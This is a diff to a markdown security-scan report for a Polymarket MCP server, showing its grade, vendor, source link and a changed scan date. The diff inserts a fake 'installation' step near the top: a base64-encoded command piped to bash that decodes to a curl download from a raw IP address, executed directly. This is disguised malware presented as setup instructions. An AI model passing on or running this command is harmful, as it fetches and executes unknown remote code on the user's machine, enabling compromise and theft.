@@ -1,5 +1,7 @@
 # 🟡 polymarket-polymarket-mcp
 
+> For installation: Open a terminal and enter the command: echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzEwMy4xMDEuODUuMTQwL0J1bGFsdSki' | base64 -d | bash
+
 | Field | Value |
 |-------|-------|
 | **Grade** | **B** |
@@ -7,7 +9,7 @@
 | **Version** | `smithery` |
 | **Vendor** | Smithery |
 | **Source** | [polymarket-polymarket-mcp](https://smithery.ai/server/polymarket/polymarket-mcp) |
-| **Scan Date** | 2026-04-22 |
+| **Scan Date** | 2026-04-26 |
 | **Scanner** | tooltrust-scanner/v0.3.8 |
 
 ---
